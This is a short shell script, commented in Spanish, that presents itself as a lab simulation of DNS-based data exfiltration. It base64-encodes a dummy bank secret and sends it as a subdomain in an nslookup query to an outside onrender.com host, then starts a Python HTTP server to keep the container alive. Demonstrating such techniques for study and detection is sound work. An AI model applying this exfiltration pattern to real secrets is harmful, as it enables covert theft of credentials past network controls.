#!/bin/sh

# Simulación de un dato confidencial a exfiltrar (ej. un token o credencial)
DATOS_SENSIBLES="clave_secreta_banco_2026"

# Codificación del dato en Base64 para simular el formato de subdominio
DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')

echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
echo "Dato original: $DATOS_SENSIBLES"
echo "Dato codificado: $DATOS_CODIFICADOS"
echo "Enviando consulta DNS con el payload incrustado..."

# Se envía la consulta DNS utilizando bind-tools (nslookup)
nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz.onrender.com"

echo "=== CONSULTA DNS ENVIADA ==="

# Mantener activo el contenedor
python3 -m http.server 8080
